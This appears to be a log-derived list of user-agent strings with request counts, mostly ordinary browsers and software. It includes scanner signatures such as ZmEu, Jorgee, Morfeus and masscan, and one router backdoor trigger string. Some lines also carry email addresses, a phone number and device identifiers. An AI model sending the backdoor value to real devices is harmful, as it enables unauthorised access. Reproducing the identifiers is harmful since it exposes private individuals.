+2;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.3539 Yowser/2.5 Safari/537.36
+2;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36
+2;Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0
+2;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
+2;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
+2;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
+2;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+2;Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6
+2;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19
+2;Mozilla/5.0 Project 25499 (project25499.com)
+2;netscan.lekus.su
+2;SCAgent
+2;SonyEricssonPCCompanion
+2;StatsInfo
+2;submit-client/1.0
+2;VEhMIFcyMDA7MTc7NC4yLjE7VEhMLUNOLTlCMThELVAxODhGMDRWMS4xLjE7MzUzNzQ2MDIxMDkzNzEyOzI1MDIwMzMxMjkyODU4MztudWxsOztudWxsO251bGw7O251bGw7bnVsbDtjb20ubW9iaWxldW5jbGUudG9vbGJveDozMjc6Y29tLm1vYmlsZXVuY2xlLnRvb2xib3guc2VydmljZS5Ub29sQm94U2VydmljZTsxO1RFTEUy
+2;Yandex.Browser lite installer
+2;Z3Vlc3Ntb2JpbGUjfCNUSEwtQ04tOUIxOEQtUDE4OEYwNFYxLjEuMQ==
+20;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E; MSOffice 12)
+20;Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)
+20;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
+20;SLSSoapClient
+20;unused/0 (hammerhead MMB29U); gzip
+2000;RemoteConfigFetcher
+200007;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+20275;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
+204;Mozilla/5.0 Jorgee
+20632;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0
+209;Mozilla/5.0 (ABE, https://noscript.net/abe/wan)
+21;2gis/1.0.0.4910 (Windows 5.1 build 2600 NT Service Pack 3) 8bfbc53c-3363-4c85-bd5c-3e9ec42bf632
+21;2gis/1.0.0.4910 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
+21;2gis/1.0.0.4910 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
+21;2gis/3.15.7.4910 (Windows 5.1 build 2600 NT Service Pack 3) 793d80f8-2746-464f-8aeb-e19627a7f8f5
+21;Chrome Service 45.0.2454.101(3b3c00f2d95c45cca18ab944acced413fb759311-refs/branch-heads/2454@{#502}) Windows NT 5.1
+21;Java/1.8.0_60
+21;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+211;Mozilla/4.0 (compatible; ICS)
+21168;Mozilla/5.0 (Windows NT 6.1; rv:44.0) Gecko/20100101 Firefox/44.0
+214925;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+216;mbam - consumer_unknown (Manual) - base:2.2.0.1024 - rules:v2015.12.24.03 swissarmy:v2015.12.18.01 actions:v2015.12.15.02 domains:v2015.12.23.04 ips:v2015.12.21.01 akadomains:v2015.09.11.02 akaips:v2015.09.11.02
+22;HP Rules Engine/2.0
+22;User-Agent:Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+2202;Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0
+22075;MRAICQ 8.1 (build 6347) 623305058 icq
+2217;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+22267;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.82
+2249;okhttp/2.5.0
+2287;Shockwave Flash
+229058;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
+23;Agoo-sdk-uc-2.0
+23;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+23;Mozilla/4.0 (compatible; qip4983; QSI2; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+231;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko
+23297;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36 OPR/35.0.2066.68
+233;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)
+23483;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47
+239;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
+239;SeaPort/7.3
+2401;Syncer/8.00 (unknown)
+2426;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36
+244;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 YaBrowser/15.10.2454.3865 Safari/537.36
+24635;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+249;2gis/1.0.0.4952 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
+249;Chrome WIN 48.0.2564.109 (dee993990fa912f87e4d1eb5822d408be4896ea5-refs/branch-heads/2564@{#684}) channel(stable)
+249;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36
+25;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+25;ru.ntv.client_v3.3.4
+25;THL W200; MIUI/3.12.20
+250280;Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0
+252;Adobe Flash Player
+254432;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+259;Download Flash Player Installer/1.0
+26;Collector Network Agent/1.00
+26;CPM-Perl
+26;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML
+266;Chrome WIN 48.0.2564.116 (700a0e589ecfa7e0f65cace17e2f75470c4adf9d-refs/branch-heads/2564@{#706}) channel(stable)
+27;Mozilla/3.0 (compatible; Acrobat 5.0; Windows)
+27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/537.86.3
+270;avast! Emergency Update Agent
+275;2gis/1.0.0.4952 (Windows 6.1 build 7601 NT Service Pack 1) e75bc49b-a6e1-40af-8020-d2685f89db46
+27594;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+28;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.0
+28;ut_core BenchHttp (ver:41162)
+29;2gis/3.15.10.4952 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
+29;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; GTB7.5; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+29;Mozilla/5.0 (Windows NT 5.2; rv:38.0) Gecko/20100101 Firefox/38.0
+29;Skype� 6.14
+29;unused/0 (ASUS_T00F KVT49L); gzip
+29183;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+293;Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+2948;okhttp/3.0.1
+295;ut_core BenchHttp (ver:41865)
+297184;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
+3;APClient
+3;ClipOrganizer
+3;dsk
+3;DXCoreServiceToken
+3;DXStatisticAppInfo
+3;Google Update/1.3.28.15;winhttp;cup-ecdsa
+3;Java/1.8.0_66
+3;libwww-perl/6.15
+3;m2 note; 5.1; Flyme OS 4.5.4.2I; ru-ru
+3;mailrutool
+3;Morfeus Fucking Scanner
+3;Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]
+3;Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+3;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)
+3;Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
+3;Mozilla/4.0 (compatible; qip4983; QSI11; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+3;Mozilla/4.0 (compatible; qip4983; QSI12; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+3;Mozilla/4.0 (compatible; qip4983; QSI17; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+3;Mozilla/4.0 (compatible; qip4983; QSI9; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+3;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
+3;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.4.2403.3 Amigo/44.4.2403.3 MRCHROME SOC Safari/537.36
+3;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:30.N) Gecko/20110302 Firefox/30.0
+3;Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; NP06; rv:11.0) like Gecko
+3;Mozilla/5.0 (Windows NT 6.3; rv:36.0 Gecko/20100101 Firefox/36.0
+3;MpGears
+3;MS Clearing House Default Agent
+3;NSPlayer/11.0.5721.5251 WMFSDK/11.0
+3;NSPlayer/9.00.00.4504
+3;Opera autoupdate agent/1.1.9
+3;Python-urllib/2.7
+3;Skype� 7.5
+30;Lavf/56.15.102
+300983;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+303;Chrome WIN 47.0.2526.111 (88b253bb9dc57f80dc576f296dcf5e5df5cfb7b6-refs/branch-heads/2526@{#545}) channel(stable)
+30385;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+30416;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25
+306497;Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0
+306509;GoogleEarth/6.2.1.6014(Windows;Microsoft Windows (5.1.2600.3);ru;kml:2.2;client:Free;type:default)
+31;Le Roukin
+31;UCWEB7.0.2.37/28/999
+31172;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25 (Edition Yx)
+314;client connection
+3140;Mozilla/5.0 (Windows; N; Windows NT 5.1; ru-RU) AppleWebKit/532.4 (KHTML, like Gecko) Google Earth/6.2.1.6014 Safari/532.4
+315;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; McAfee)
+32;Google Update/1.3.29.1;winhttp
+32;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2; Windows-Media-Player/12.0.7601.17514)
+32;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)
+3205;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24
+33;Hewlet Packard eDiags
+33;kh_lt/LT6.2.1.6014
+33;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
+3346;Post_Multipart
+339;SeaPort/2.0
+34;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:89a489a69475545cf53aea7c43dbb578)
+34;NSIS_Inetc (Mozilla)
+341;Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
+3422;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92
+359;MRAICQ 8.1 (build 6347) lu-exmar@yandex.ru icq
+363;BTWebClient/3450(41865)
+36340;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.0.6151 Safari/537.36
+364;unused/0 (P188F04 JOP40D); gzip
+366;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)
+37;A/5.0.2/LGE/LG-D802/MSM8974/Tele2
+37;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.7.0
+37;okhttp/2.7.4
+37;TouchPalv5 (g2 LRX22G)
+378;WifiHotspot
+3799;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36
+38;Innova 4game Service/1.0
+38;Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)
+38;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.7.0 Lightning/4.0.7
+38602;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+39;Silverlight
+39;whitelist-client/1.0
+393;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20100922 Linux Mint/10 (Julia) Firefox/3.6.10
+39824;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.3.0.6796 Yowser/2.5 Safari/537.36
+4;17track - ProxyAnalytics
+4;A/5.1.1/Sony/D6503/MSM8974/MTS#RUS
+4;DavClnt
+4;Google Update/1.3.24.15;winhttp
+4;HP-Inkjet-WebUpdate-1.1-lw
+4;InTouchDownloader
+4;LibreOffice 4.3.4.1 (bc356b2f991740509f321d70e4512a6a54c5f243; Windows; x86; BundledLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia cs cy da de dgo dz el en-GB en-ZA eo es et eu fa fi fr ga gd gl gu he hi hr hu id is it ja ka kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ ta te tg th tn tr ts tt ug uk uz ve vi xh zh-CN zh-TW zu)
+4;Microsoft-WNS/10.0
+4;Mozilla/4.0 (compatible; qip4983; QSI13; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+4;Mozilla/4.0 (compatible; qip4983; QSI16; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+4;Mozilla/4.0 (compatible; qip4983; QSI30; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+4;Mozilla/4.0 (compatible; qip4983; QSI6; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+4;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:97e22767e9d3be28558047445f0f6835)
+4;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)
+4;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8
+4;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
+4;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2.1
+4;Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
+4;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+4;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3
+4;null (primou IML74K); gzip
+4;PicasaUpdater/3.9.138.151 (gzip)
+4;Ray-Downer
+4;RDSClient
+4;Skype� 6.20
+4;TWSDK
+4;unused/0 (primou IML74K); gzip
+4;WinDjView
+4;Xenu Link Sleuth/1.3.8
+4;xmlset_roodkcableoj28840ybtide
+40;Chrome WIN 45.0.2454.101 (3b3c00f2d95c45cca18ab944acced413fb759311-refs/branch-heads/2454@{#502}) channel(stable)
+40;Mozilla/4.0 (compatible; qip8082; Windows NT 6.0; ID:b980dbe40744289df13f55cc4bc26e3c)
+40;Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091211 Sunbird/1.0b1
+403;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.95 Safari/537.36
+409;libcurl/7.43.0 OpenSSL/1.0.1l zlib/1.2.8
+41;Dr.Web anti-virus License:DRWEB KEY (Support ES) LicenseState:LICENSE KEY Version: 9.01.3.7037 Device model: Ixion X250 OctaVa Firmware version: 4.4.2
+41;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; QQDownload 717; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+41;NSPlayer/12.00.9651.0000 WMFSDK/12.00.9651.0000
+412;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36 OPR/29.0.1795.47
+41205;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47
+413;Mozilla/4.0 (compatible; qip4983; Windows NT 5.1)
+42;2gis/1.0.0.5247 (Windows 5.1 build 2600 NT Service Pack 3) cc54d6bc-b764-4e37-9737-5b8da65bd5dd
+42;Mozilla/4.0 (CCleaner, 5.14.5493)
+42;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:c2603537ba918a65429e6b6fbf069b48)
+4218;NativeHost
+43;Mozilla/4.0 (compatible; qip4983; Windows NT 5.1;
+4305;Mozilla/5.0
+43836;2gis/3.14.6.4714 (Windows 6.1 build 7601 NT Service Pack 1) e75bc49b-a6e1-40af-8020-d2685f89db46
+44;Wget/1.11.4
+445043;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+445602;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.103 Safari/537.36
+45;Mozilla/4.0 (compatible; MSIE 9.11.9600.18124; Windows NT 6.1)
+45;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:7d91c723f63376a4bb71e689914dfe5d)
+455;MRAICQ 8.3 (build 7317) siga.zlo@list.ru icq
+456;Mozilla/4.0 (compatible; MSIE 9.11.9600.18163; Windows NT 6.1)
+456;MPFv
+459;okhttp/2.6.0
+459099;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+459919;Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0
+46;mp-ua/3.0.0/a=ARMv7Processorrev2(v7l)/h=MT6589
+46;ZmEu
+462;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 8bfbc53c-3363-4c85-bd5c-3e9ec42bf632
+464;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
+47;apache 0day by @hxmonsegur
+47;eTranslator
+47;Mozilla/4.0 (compatible; qip8082; Windows NT 5.1; ID:ec325620db2fa5b85d4697b1ae1a90d3)
+47;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:d7c6c320677939ec051042a65483112a)
+47;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:fd88ab401d5c46bea8f90beadce3c70d)
+470;Smart Panel
+47310;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.82
+48;Google Update/1.3.29.5;winhttp
+48;Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.04 (lucid) Firefox/3.6.18
+483;Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
+4844;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+49;AVGDM-WV7XDX64 160 BUILD=7442 MSI=0 LOC=RU PRD=RU-F-Free BRD=0-0-0 BRH=0 PKG=692 PKP=0
+49;Mozilla/4.0 (compatible; qip4301; QSI; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
+49;Windows-Media-Player/11.0.5721.5280
+495;AntUx config manager
+495;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.5; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+5;"nlpproject.info research"
+5;(null)/(null) ((null))
+5;1.7.3-B/267349/4.1.2
+5;AutoIt
+5;curl/1.1
+5;curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.19.1 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2
+5;curl/7.43.0
+5;Dr.Web anti-virus Light Version: 9.00.2.14001 Device model: THL W200 Firmware version: 4.2.2
+5;Dr.Web Light Version: 9.01.2.14007 Device model: H7500+ Firmware version: 4.1.2
+5;Microsoft-WNS/6.3
+5;Mozilla/3.0 (compatible)
+5;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)
+5;Mozilla/4.0 (compatible; qip4983; QSI1; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+5;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
+5;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+5;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 Scanning for research (researchscan.comsys.rwth-aachen.de)
+5;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 OPR/35.0.2066.37 (Edition Campaign 34)
+5;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
+5;webtrans
+50;Mozilla/4.0 (compatible; qip8095; Windows NT 6.0; ID:795ef57d53f9bea0c4efbf51b85dd8bc)
+50;NSPlayer/10.0.0.3702 WMFSDK/10.0
+50;unused/0 (k05ts_a LMY47D); gzip
+50241;MRAICQ 8.4 (build 7786) +79215954436 icq
+502848;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
+51;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:b2f1be5224c36fa8bf22fb0174fdc61a)
+51;VLC media player - version 0.9.8a Grishenko - (c) 1996-2008 the VideoLAN team
+52;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:e14f92973aa7439472fa9095bf33a6ba)
+52;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
+52;Office Source Engine
+521;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/537.86.4
+523;HTTPS Client
+53;Mozilla/4.0 (compatible; qip4983; QSI; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
+53;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; ID:de4da634b74f39a4580ac1937c98381d)
+53;Ruby
+5313;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36 OPR/32.0.1948.69 (Edition Yx)
+53589;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92
+53635;MRAICQ 8.4 (build 7786) 699879647 icq
+5382;uTorrent/345(109814172)(41372)
+54;Mozilla/4.0 (compatible; qip8092; Windows NT 5.1; ID:49bdcf531ea8599bc532d1fed5d21de8)
+5573;MRAICQ 8.3 (build 7317) 676775123 icq
+56;Mozilla/4.0 (compatible; qip7000; Windows NT 5.1;
+56;Mozilla/4.0 (compatible; qip8082; Windows NT 6.0; ID:9021a6147d1c0cb5d6009c88ca8d9464)
+56;Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0
+56;uTorrent/345(109814665)(41865)
+57;iTVA Installer
+57;Mozilla/4.0 (compatible; qip7000)
+57675;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92
+579;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
+58;MEIZU
+58;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.5.1 Lightning/4.0.5.2
+58;NVIDIA GFE v10.11.15
+5864;MailRuUpdater
+59;/4.0.0.2
+59;Mozilla/5.0 zgrab/0.x
+59;NVIDIA GFE v18.5.1
+59077;MRAICQ 8.3 (build 7317) 488722743 icq
+594;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.1)
+5944;Mozilla/5.0 (Windows NT 5.1; rv:45.0) Gecko/20100101 Firefox/45.0
+595;ut_core BenchHttp (ver:41712)
+6;curl/7.38.0
+6;masscan/1.0 (https://github.com/robertdavidgraham/masscan)
+6;Microsoft Office/11.0 (Windows NT 6.1; Microsoft Excel 11.0.8172; Pro)
+6;Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)
